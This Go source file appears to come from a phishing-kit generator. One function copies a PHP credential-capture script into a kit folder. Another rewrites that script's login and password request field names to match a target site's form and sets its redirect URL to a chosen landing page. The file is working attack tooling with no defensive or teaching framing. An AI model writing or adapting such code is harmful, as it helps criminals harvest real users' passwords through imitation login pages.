package main

import (
	"bytes"
	"io/ioutil"
)

// CopyPhpToKit (phpfilename string, destFolder string): copy PHP file in destFolder
func CopyPhpToKit(phpfilename string, destFolder string) error {

	// check if PHP file exists
	phpfile, err := ioutil.ReadFile(phpfilename)
	if err != nil {
		return err
	}

	// create file in dest folder
	err = ioutil.WriteFile(destFolder+"/"+phpfilename, phpfile, 0644)
	if err != nil {
		return err
	}
	return nil
}

//  PatchPhp (phppath string, postLogin string, postPassword string urlin string): patch PHP with url redirection and correct names of attributes for credentials
func PatchPhp(phppath string, postLogin string, postPassword string, urlin string) error {

	// open new php file
	read, err := ioutil.ReadFile(phppath)
	if err != nil {
		return err
	}

	newContents := []byte(read)

	// replace login and password names from form
	if postLogin != "login" {
		newContents = bytes.Replace(newContents, []byte("$_REQUEST['login']"), []byte("$_REQUEST['"+postLogin+"']"), -1)
	}

	if postPassword != "password" {
		newContents = bytes.Replace(newContents, []byte("$_REQUEST['password']"), []byte("$_REQUEST['"+postPassword+"']"), -1)
	}

	// replace landing page with given URL
	newContents = bytes.Replace(newContents, []byte("header('Location: \"\"');"), []byte("header('Location: "+urlin+"');"), -1)

	err = ioutil.WriteFile(phppath, newContents, 0)
	if err != nil {
		return err
	}

	return nil
}
